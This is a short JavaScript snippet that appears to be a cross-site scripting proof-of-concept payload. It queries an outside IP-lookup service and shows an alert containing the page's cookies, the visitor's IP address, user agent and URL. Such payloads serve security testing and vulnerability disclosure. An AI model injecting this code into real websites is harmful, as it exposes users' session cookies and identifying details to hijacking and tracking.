fetch('//api.ipify.org?format=json')
  .then(r => r.json())
  .then(d => {
    alert('Cookie: ' + document.cookie +
      '\nIP: ' + d.ip +
      '\nUA: ' + navigator.userAgent +
      '\nURL: ' + location.href);
  });
